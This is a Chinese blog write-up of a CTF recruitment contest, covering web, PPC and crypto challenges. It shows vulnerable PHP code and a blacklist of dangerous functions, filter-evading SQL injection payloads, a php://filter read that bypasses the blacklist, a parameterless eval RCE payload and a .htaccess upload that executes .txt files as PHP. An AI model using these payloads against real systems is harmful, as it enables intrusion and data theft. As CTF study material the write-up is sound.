---
title: SDPCSEC纳新赛1.0
date: 2025-12-20 17:48:05
tags:
index_img: https://gitee.com/bobrocket/img/raw/master/img/69493c53c154427986d9eed9.png
categories: CTF
---

# WEB

## 五言

```php
<?php
$Pr0 = $_GET['Pr0'];

if(strlen($Pr0) > 5){
    die("太太太太太长了!");
}else{
    @system($Pr0);
}
?>
```

限制Pr0只能有五个字符

![](https://pic1.imgdb.cn/item/69493bd8c154427986d9ec61.png)

## 听说你是高玩？

查看页面源代码发现ffffflllllaaaaaagggggg.php，一共有三个功能注册session、更新分数、获取flag

先更新一个假的分数

![](https://pic1.imgdb.cn/item/6946732229a616e528616a79.png)

再获取flag

![](https://pic1.imgdb.cn/item/694672e429a616e5286169f1.png)

## 断章

打开是一个注册登录，进去之后可以查询id，应该是sql注入

先试试 2-1 发现被过滤了，那再试试 2*3 发现不是整数型注入

再试 ' 出现报错，可以确定是字符型注入，大概长这样

```sql
SELECT * FROM table_name WHERE 'id=注入点'
```

下面注入 `1' #` 发现#也被过滤了

一顿乱搞发现and，or，select都被替换为空了，没关系可以双写绕过

所以只要想办法把后面的单引号闭合就行了

```sql
1' anandd 1=2 union selselectect database(),2,3,4 where '1'='1 #爆数据库
```

**Terra_Data**

注意下面用到的information中也有or

```sql
1' anandd 1=2 union selselectect 1,2,3,group_concat(table_name)from infoorrmation_schema.tables where table_schema='Terra_Data
```

不知道为啥，这个不行，返回none

```sql
1' anandd 1=2 union selselectect 1,2,3,group_concat(table_name)from infoorrmation_schema.tables where table_schema=database() anandd '1'='1 #爆表
```

**secret**

```sql
1' anandd 1=2 union selselectect 1,group_concat(column_name),3,4 from infoorrmation_schema.columns where table_name='secret #爆字段
```

**flag**

```sql
1' anandd 1=2 union selselectect group_concat(flag),2,3,4 from terra_data.secret where '1'='1
```

提示没有权限

```sql
1' anandd 1=2 union selselectect group_concat(flag),2,3,4 from secret where '1'='1
```

![](https://pic1.imgdb.cn/item/694677f429a616e52861758a.png)

## 浮光

打开发现什么都没有，先拿dirsearch扫一下

![](https://pic1.imgdb.cn/item/6946788729a616e528617753.png)

发现源码泄露

```php
<?php
error_reporting(0); 

#被你找到了:(
#给你准备了一份小礼物放在了gift.php中了哦~

function check($key){
    $blacklist = [
        'file', 'phar', 'zip', 'data', 'glob', 'expect', 'ftp',
        'etc', 'proc',
        'base64',  'string',  'rot13', 'quoted', 'zlib', 'input', 'ter/res',
        'eval', 'system', 'exec', 'shell_exec', 'popen', 'passthru', 'echo'
    ];

    foreach ($blacklist as $keyword){
        if (stripos($key, $keyword) !== false){
            return false;
        }
    }
    return true;
}

$file = $_POST['file'];

#直接读文件是不可以的~
if (filter_var($file, FILTER_VALIDATE_URL)){
    #waf?!
    if (check($file)){
        $content = @file_get_contents($file);
        echo $content;
    }else{
        echo "waf!!!";
    }
}else{
    echo "无效的url格式";
}
?>
```

index.php存在文件读取漏洞，不过过滤比较严格，既然有小礼物，那就读一下gift.php吧

```
/?file=php://filter/convert.iconv.UCS-4*.UCS-4BE/resource=gift.php
```

```php
<?php
#礼物是一份shell哦, 快来执行命令吧:)
if(';' === preg_replace('/[^\W]+\((?R)?\)/','',$_POST['m1xian'])){    
    eval($_POST['m1xian']);
}
?>
```

**正则表达式**：`/[^\W]+\((?R)?\)/`用于匹配类似函数调用的模式（如`abc()`或`abc(def())`），其中参数必须是另一个函数调用或为空。

phpinfo();   Th1s_1s_n0t_wh2t_yo3_w4nt 被骗了

想起之前ctfshow做的一句话木马变形用的无参rce，拿来用用

```
m1xian=eval(array_pop(next(get_defined_vars())));&1=system('ls /');
```

成功

![](https://pic1.imgdb.cn/item/69467a3129a616e528617d26.png)

## ez_blog_2.0

虽然我不会做但我会把容器搞坏(bushi)

存在目录穿越漏洞，结合apache上传.htaccess

```
<FilesMatch "\.txt">
  SetHandler application/x-httpd-php
</FilesMatch>
```

![](https://pic1.imgdb.cn/item/69467c6d29a616e52861873b.png)

一传上去容器就嘎了



# PPC

## 数据分析1

![](https://pic1.imgdb.cn/item/69467a9329a616e528617e53.png)



# Crypto

## Caser？

使用随波入流工具结合hint

![](https://pic1.imgdb.cn/item/69467b1729a616e52861808e.png)

## 你知道RSA吗

ai真强大

1. **计算模数 n**：`n = p × q = 91790401643935968086245576021782314389461981833511001951332959943149406173651`
2. **计算欧拉函数 φ(n)**：`φ(n) = (p-1) × (q-1) = 91790401643935968086245576021782314388855762181985072030992771608097748260704`
3. **计算私钥 d（e 的模 φ(n) 逆元）**：通过扩展欧几里得算法求得：`d = 2140100000182098039821524332228868828084465334300825336273508934146716501249`



# 补档

## ez_blog2.0

之前失败是因为目录没有r权限

利用不安全的递归创建目录创建一个新目录放脚本即可
